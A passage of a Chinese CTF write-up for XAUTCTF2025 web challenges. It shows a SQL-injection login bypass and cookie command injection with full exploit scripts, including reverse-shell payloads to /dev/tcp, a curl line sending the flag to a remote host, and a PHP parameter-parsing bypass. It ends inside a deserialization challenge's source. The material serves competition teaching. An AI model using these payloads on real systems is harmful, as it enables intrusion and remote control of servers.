<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0</span>,<span class="string">&#x27;BR&#x27;</span>,<span class="string">&#x27;scrypt:32768:8:1$97VxEEe6azNa3Jhw$9a14e8f27f9bc13ffce5af50f307e23e7ac04a5702359318785fb8e6db5120de0d822bb3d5affa1f69de07fe4cec1dfa2eeb90ecf60730f0890370c273615b3e&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>​	得到的结果是：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250104230659576.png" alt="image-20250104230659576"></p>
<p>​	执行以下<code>sql</code>语句则返回：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;aaa&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">0</span>,<span class="string">&#x27;BR&#x27;</span>,<span class="string">&#x27;scrypt:32768:8:1$97VxEEe6azNa3Jhw$9a14e8f27f9bc13ffce5af50f307e23e7ac04a5702359318785fb8e6db5120de0d822bb3d5affa1f69de07fe4cec1dfa2eeb90ecf60730f0890370c273615b3e&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250104230751621.png" alt="image-20250104230751621"></p>
<p>​	对于程序来说，便会误以为获取的这个值是从实际数据库中获取的，从而实现伪造登录的目的。</p>
<p>​	仿照数据格式进行构造：</p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20241222013923751.png" alt="image-20241222013923751"></p>
<p>​	那么登录的用户名便是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BR&#x27; union select 0,&#x27;BR&#x27;,&#x27;scrypt:32768:8:1$97VxEEe6azNa3Jhw$9a14e8f27f9bc13ffce5af50f307e23e7ac04a5702359318785fb8e6db5120de0d822bb3d5affa1f69de07fe4cec1dfa2eeb90ecf60730f0890370c273615b3e&#x27;--+</span><br></pre></td></tr></table></figure>

<p>​	密码是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br></pre></td></tr></table></figure>

<p>​	登录进来是一个2048小游戏，打累了可以歇会（）。</p>
<p>​	接下来就需要写入恶意文件名来<code>RCE</code>了，没有回显，需要打一个无回显<code>RCE</code>，写静态文件或者反弹shell都可。</p>
<p>​	payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br><span class="line">或</span><br><span class="line">|<span class="built_in">cat</span> /flag &gt; static/result.txt</span><br></pre></td></tr></table></figure>

<p>​	完整EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> generate_password_hash</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.121.201.96:64202/&quot;</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="comment"># sess_id = f&#x27;|bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">sess_id = <span class="string">f&#x27;|cat /flag &gt; static/result.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    hasd_password = generate_password_hash(password)</span><br><span class="line"></span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>&#x27; union select 0,&#x27;<span class="subst">&#123;username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;hasd_password&#125;</span>&#x27;--+&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requests.post(url+<span class="string">&quot;login&quot;</span>, data=post_data, headers=&#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">f&quot;SESSID=<span class="subst">&#123;sess_id&#125;</span>&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> requests.get(url,headers=&#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">f&quot;SESSID=<span class="subst">&#123;sess_id&#125;</span>&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_result</span>():</span><br><span class="line">    <span class="keyword">return</span> requests.get(url+<span class="string">&quot;static/result.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    login()</span><br><span class="line">    index()</span><br><span class="line">    <span class="built_in">print</span>(get_result().text)</span><br></pre></td></tr></table></figure>

<p>​	附上ckyan的漏洞利用工具：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;Exploit of XAUTCTF2025 WEB-2048Game&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&quot;--ip&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;47.121.201.96&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;IP address&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--port&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">0</span>, <span class="built_in">help</span>=<span class="string">&quot;Port number&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--rip&#x27;</span>, <span class="string">&quot;--reverse_ip&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Reverse IP address&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--rport&quot;</span>,<span class="string">&quot;--reverse_port&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1337</span>, <span class="built_in">help</span>=<span class="string">&quot;Reverse port number&quot;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">ip = args.ip</span><br><span class="line">port = args.port</span><br><span class="line">reverse_ip = args.rip</span><br><span class="line">reverse_port = args.rport</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> reverse_ip == <span class="string">&quot;&quot;</span>:</span><br><span class="line">    parser.print_help()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from werkzeug.security import generate_password_hash</span></span><br><span class="line"><span class="string">print(generate_password_hash(&quot;123456&quot;))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse_shell</span></span><br><span class="line">command = <span class="string">f&quot;bash -i &gt;&amp; /dev/tcp/<span class="subst">&#123;reverse_ip&#125;</span>/<span class="subst">&#123;reverse_port&#125;</span> 0&gt;&amp;1&quot;</span></span><br><span class="line">command_bytes = command.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">base64_bytes = base64.b64encode(command_bytes)</span><br><span class="line">base64_command = base64_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;base64_command = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">&#x27;bash$&#123;IFS&#125;-c$&#123;IFS&#125;&quot;$(echo$&#123;IFS&#125;%s|base64$&#123;IFS&#125;-d)&quot;&#x27;</span> % base64_command</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># poc = &quot;curl$&#123;IFS&#125;192.168.75.138:4444?cmd=$(cd&lt;~|cat$&#123;IFS&#125;flag);&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;POST /login HTTP/1.1\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Host: %s:%s\r\n&#x27;</span> % (ip, <span class="built_in">str</span>(port))</span><br><span class="line">payload += <span class="string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Content-Length: 221\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Cookie: SESSID=/tmp/1.txt&amp;%s;\r\n&#x27;</span> % poc</span><br><span class="line"><span class="comment"># payload += &quot;Cookie: SESSID=a|bash -c &#x27;bash -i &gt;&amp; /dev/tcp/117.72.70.186/6789 0&gt;&amp;1&#x27;\r\n&quot;</span></span><br><span class="line">payload += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;username=ck&#x27; union select 0, &#x27;ck&#x27;, &#x27;scrypt:32768:8:1$EnqnntHbS0UGSr25$b397fe3cfd04c9a0b06a2febfe4dd9554c64999325e6b416adc3fdff1daaf8abfc6defe59e3e9ba351cc07a11846dab0afe4d1e96867d994d2be62360e0633bb&#x27; --+ &#x27;&amp;password=123456\r&quot;</span></span><br><span class="line"></span><br><span class="line">p.send(payload.encode())</span><br><span class="line"><span class="comment"># print(p.recvall().decode())</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = remote(ip, port)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;POST / HTTP/1.1\r\n&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;Host: %s:%s\r\n&#x27;</span> % (ip, <span class="built_in">str</span>(port))</span><br><span class="line">payload2 += <span class="string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0\r\n&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded\r\n&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;Content-Length: 221\r\n&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;Cookie: SESSID=1.txt&amp;%s;\r\n&#x27;</span> % poc</span><br><span class="line"><span class="comment"># payload2 += &quot;Cookie: SESSID=a|bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;\r\n&quot;</span></span><br><span class="line">payload2 += <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload2.encode())</span><br></pre></td></tr></table></figure>

<p>​	运行示例：<code>python3 exp.py --ip 47.121.201.96 --port 58290 --rip 47.121.201.96 --rport 55555</code></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250121191143148.png" alt="image-20250121191143148"></p>
<p>​	监听：<code>nc -lvnp 55555</code></p>
<p><img src="/img/loading.gif" data-original="/../post_img/635e288d692f8f992bab00a977b2c204/image-20250121191231606.png" alt="image-20250121191231606"></p>
<h3 id="EZ-PHP"><a href="#EZ-PHP" class="headerlink" title="EZ_PHP"></a>EZ_PHP</h3><p><strong>题目描述</strong></p>
<p>​	<b style="color:cyan;">出题人: </b>Echo</br><br>​	<b style="color:cyan;">难度: </b>简单</br></p>
<p>​	太好了，是PHP，我们有救了！</p>
<p><strong>题解</strong></p>
<p>​	题目给出源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;XAUT_CTF.COM&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^xaut$/im&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^xaut$/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;n&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$m</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line">            <span class="variable">$n</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$t</span>[<span class="string">&#x27;xaut&#x27;</span>] == <span class="title function_ invoke__">md5</span>(<span class="variable">$n</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你离胜利不远啦，加油！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请绕过一下哦！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	完成以下条件即可获取flag：</p>
<ol>
<li>POST传入<code>XAUT_CTF.COM</code>参数使其有值；</li>
<li>GET传入<code>a</code>参数，且其需要满足<code>preg_match(&#39;/^xaut$/im&#39;,$a)</code>的匹配；</li>
<li>GET传入<code>a</code>参数，且其需要不满足<code>preg_match(&#39;/^xaut$/i&#39;,$a)</code>的匹配；</li>
<li>POST传入<code>m</code>参数和<code>n</code>参数，使m参数按照URL查询参数的格式解析后，其<code>xaut</code>参数的值与<code>n</code>的md5值相同；</li>
</ol>
<ul>
<li><p>对于条件1，需要利用php的解析特性达成，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/bin789456/article/details/120305682">PHP字符串解析特性</a>，传入<code>XAUT[CTF.COM=1</code>即可；</p>
</li>
<li><p>对于条件2与条件3，条件2是多行匹配，条件3是单行匹配，当传入<code>a=%0axaut</code>时(%0a是换行符的url编码)，条件2在第一行没有匹配到，在第二行匹配到，条件达成，而条件3在第一行没有匹配到，匹配失败，条件达成；</p>
</li>
<li><p>对于条件4，传入<code>m=xaut=19d3326f3137cbadd21ce901a9bed4a7&amp;n=BR</code>即可</p>
<p>完整EXP：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.121.201.96:58325/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">&quot;XAUT[CTF.COM&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;m&quot;</span>: <span class="string">&quot;xaut=19d3326f3137cbadd21ce901a9bed4a7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;n&quot;</span>: <span class="string">&quot;BR&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url+<span class="string">&quot;?a=%0axaut&quot;</span>,data=post_data)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    res = exp().text</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>



<h3 id="独孤九剑"><a href="#独孤九剑" class="headerlink" title="独孤九剑"></a>独孤九剑</h3><p><strong>题目描述</strong></p>
<p><b style="color:cyan;">	出题人: </b>hsad</br><br>    <b style="color:cyan;">难度: </b>普通</br></p>
<p>​	一名程序员正在调试一款应用，却发现数据在传输过程中变得异常，数据似乎被人进行了篡改。</p>
<p>​	于是经过一番研究，他决定到这些特殊的字符串需要特殊处理，避免被恶意利用。</p>
<p>​	为了修复这个问题，他设计了一套机制，可以自动检测和规范化信息格式，还能将一些错误的片段替换为安全的内容。最终，他成功解	决了漏洞，让系统运行得更加稳定和高效……….吗？</p>
<p><strong>题解</strong></p>
<p>​	访问题目获得源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Linghuchong.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Move</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;move&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;move&#x27;</span>] : <span class="string">&#x27;独孤九剑&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Checker</span> = <span class="keyword">new</span> <span class="title class_">Orz</span>(<span class="variable">$Move</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Checker</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Lonely_Nine_Swords</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Caused a error...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	再访问看一下<code>Linghuchong.php</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lonely_Nine_Swords</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$esoterica</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_shi&quot;</span> =&gt; <span class="string">&quot;Gen_Stance&quot;</span>, </span><br><span class="line">        <span class="string">&quot;di_er_shi&quot;</span> =&gt; <span class="string">&quot;Sword-defeating_Stance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_shi&quot;</span> =&gt; <span class="string">&quot;Saber-defeating_Stance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_shi&quot;</span> =&gt; <span class="string">&quot;Spear-defeating_Stance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_shi&quot;</span> =&gt; <span class="string">&quot;Whip-defeating_Stance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_shi&quot;</span> =&gt; <span class="string">&quot;Chain_whip-defeating_Stance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_shi&quot;</span> =&gt; <span class="string">&quot;Palm-defeating_Stance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_shi&quot;</span> =&gt; <span class="string">&quot;Arrow-defeating_Stance&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_shi&quot;</span> =&gt; <span class="string">&quot;Qi-defeating_Stance&quot;</span> </span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$esoterica</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Orz</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Move</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sword_Owner</span> = <span class="string">&#x27;Nobodyxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Move = <span class="variable">$move</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Sword_Owner = <span class="string">&#x27;Nobodyxxxx&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Sword_Owner !== <span class="string">&#x27;DuguQiubai&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You still don&#x27;t understand the way of swordsmanship&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="variable">$flag</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">filesize</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You are a true swordsman...&quot;</span> . <span 